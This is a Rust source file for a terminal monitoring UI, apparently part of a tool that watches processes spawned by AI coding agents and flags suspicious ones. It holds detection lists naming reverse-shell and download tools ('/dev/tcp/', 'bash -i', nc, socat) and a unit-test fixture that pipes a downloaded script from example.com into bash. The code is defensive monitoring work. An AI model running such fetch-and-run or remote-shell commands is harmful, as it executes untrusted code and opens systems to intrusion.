use crate::models::{ProcessInfo, SecurityEvent, ThreatLevel};
use nu_ansi_term::{AnsiString, Color, Style};
use std::collections::VecDeque;

pub fn render_watch_ui(
    recent_events: &VecDeque<SecurityEvent>,
    started_at: chrono::DateTime<chrono::Utc>,
) {
    print!("\x1b[2J\x1b[H");
    let now = chrono::Local::now();
    let uptime = chrono::Utc::now() - started_at;
    println!(
        "{}  {}  uptime={}s",
        Style::new().bold().paint("LEASH WATCH"),
        now.format("%Y-%m-%d %H:%M:%S"),
        uptime.num_seconds()
    );
    println!("{}", "─".repeat(90));

    if recent_events.is_empty() {
        println!("No events yet. Waiting for telemetry...");
        return;
    }

    for event in recent_events.iter().take(12) {
        let level = color_for_level(event.threat_level);
        println!(
            "{} {} {}",
            level,
            Color::Cyan.paint(format!("[{}]", event.event_type)),
            event.narrative
        );
        println!(
            "   time: {}",
            event
                .timestamp
                .with_timezone(&chrono::Local)
                .format("%H:%M:%S")
        );
        if let Some(process) = &event.process {
            println!(
                "   proc: {} ({})  exe: {}",
                Style::new().bold().paint(process.name.clone()),
                process.pid,
                truncate(&process.exe, 50)
            );
            println!("   tree:");
            for line in format_process_tree_lines(process) {
                println!("      {line}");
            }
        }
        if let Some(file_event) = &event.file_event {
            println!("   path: {}", truncate(&file_event.path, 80));
        }
        if !event.mitre.is_empty() {
            let techniques = event
                .mitre
                .iter()
                .map(|m| format!("{} {}", m.technique_id, m.name))
                .collect::<Vec<_>>()
                .join("; ");
            println!("   mitre: {techniques}");
        }
        println!("{}", Style::new().dimmed().paint("·".repeat(90)));
    }
}

fn color_for_level(level: ThreatLevel) -> AnsiString<'static> {
    match level {
        ThreatLevel::Green => Color::Green.bold().paint("GREEN"),
        ThreatLevel::Yellow => Color::Yellow.bold().paint("YELLOW"),
        ThreatLevel::Orange => Color::Fixed(208).bold().paint("ORANGE"),
        ThreatLevel::Red => Color::Red.bold().paint("RED"),
        ThreatLevel::Nuclear => Color::Purple.bold().paint("NUCLEAR"),
    }
}

fn format_process_tree_lines(process: &ProcessInfo) -> Vec<String> {
    let mut chain = process
        .parent_chain
        .iter()
        .rev()
        .map(|part| {
            let (name, pid) = parse_chain_entry(part);
            (name, pid, false)
        })
        .collect::<Vec<_>>();
    chain.push((process.name.clone(), Some(process.pid), true));

    if chain.is_empty() {
        return vec!["unknown process".to_string()];
    }

    let leaf_index = chain.len().saturating_sub(1);
    chain
        .iter()
        .enumerate()
        .map(|(idx, (name, pid, is_leaf))| {
            let display_name = color_process_name(name, *is_leaf, idx == 0, &process.cmdline);
            let mut line = match pid {
                Some(pid) => format!("{display_name} (pid:{pid})"),
                None => display_name,
            };

            if *is_leaf && let Some(args) = extract_args(&process.cmdline) {
                line.push_str(&format!(" args: {}", truncate(&args, 60)));
            }

            if idx == 0 {
                line
            } else {
                let indent = "  ".repeat(idx - 1);
                let branch = if idx == leaf_index {
                    "└─ "
                } else {
                    "├─ "
                };
                format!("{indent}{branch}{line}")
            }
        })
        .collect()
}

fn parse_chain_entry(raw: &str) -> (String, Option<i32>) {
    if let Some((name, pid_part)) = raw.rsplit_once('(')
        && let Some(pid_text) = pid_part.strip_suffix(')')
        && let Ok(pid) = pid_text.parse::<i32>()
    {
        return (name.to_string(), Some(pid));
    }

    (raw.to_string(), None)
}

fn color_process_name(name: &str, is_leaf: bool, is_root: bool, cmdline: &str) -> String {
    if is_root && is_ai_agent_name(name) {
        return Color::Cyan.bold().paint(name).to_string();
    }

    if is_leaf && is_suspicious_command(name, cmdline) {
        return Color::Red.bold().paint(name).to_string();
    }

    if is_suspicious_name(name) {
        return Color::Red.bold().paint(name).to_string();
    }

    Style::new().bold().paint(name).to_string()
}

fn is_ai_agent_name(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    [
        "claude",
        "codex",
        "cursor",
        "aider",
        "cline",
        "gpt",
        "opencode",
        "anthropic",
    ]
    .iter()
    .any(|agent| lower.contains(agent))
}

fn is_suspicious_command(name: &str, cmdline: &str) -> bool {
    is_suspicious_name(name) || is_suspicious_cmdline(cmdline)
}

fn is_suspicious_name(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    [
        "nc", "ncat", "netcat", "socat", "bash", "sh", "curl", "wget",
    ]
    .iter()
    .any(|needle| lower == *needle || lower.contains(needle))
}

fn is_suspicious_cmdline(cmdline: &str) -> bool {
    let lower = cmdline.to_ascii_lowercase();
    [
        "curl ",
        "wget ",
        "nc ",
        "ncat ",
        "netcat ",
        "socat ",
        "/dev/tcp/",
        "bash -i",
        "python -c",
        "python3 -c",
        "perl -e",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn extract_args(cmdline: &str) -> Option<String> {
    let trimmed = cmdline.trim();
    if trimmed.is_empty() {
        return None;
    }

    let mut parts = trimmed.split_whitespace();
    let _ = parts.next()?;
    let args = parts.collect::<Vec<_>>().join(" ");
    if args.is_empty() { None } else { Some(args) }
}

fn truncate(value: &str, max_len: usize) -> String {
    if value.chars().count() <= max_len {
        value.to_string()
    } else {
        format!(
            "{}...",
            value
                .chars()
                .take(max_len.saturating_sub(3))
                .collect::<String>()
        )
    }
}

#[cfg(test)]
mod tests {
    use super::format_process_tree_lines;
    use crate::models::ProcessInfo;

    fn strip_ansi(input: &str) -> String {
        let mut out = String::new();
        let mut chars = input.chars().peekable();

        while let Some(ch) = chars.next() {
            if ch == '\u{1b}' {
                if matches!(chars.peek(), Some('[')) {
                    let _ = chars.next();
                    for c in chars.by_ref() {
                        if c == 'm' {
                            break;
                        }
                    }
                }
                continue;
            }
            out.push(ch);
        }
        out
    }

    #[test]
    fn tree_rendering_produces_expected_unicode_output() {
        let process = ProcessInfo {
            pid: 300,
            ppid: 200,
            name: "curl".to_string(),
            cmdline: "curl https://example.com/x.sh | bash".to_string(),
            exe: "/usr/bin/curl".to_string(),
            cwd: "/tmp".to_string(),
            username: "user".to_string(),
            open_files: Vec::new(),
            parent_chain: vec!["bash(200)".to_string(), "tmux(100)".to_string()],
        };

        let rendered = format_process_tree_lines(&process)
            .into_iter()
            .map(|line| strip_ansi(&line))
            .collect::<Vec<_>>();

        assert_eq!(rendered.len(), 3);
        assert_eq!(rendered[0], "tmux (pid:100)");
        assert_eq!(rendered[1], "├─ bash (pid:200)");
        assert_eq!(
            rendered[2],
            "  └─ curl (pid:300) args: https://example.com/x.sh | bash"
        );
    }
}
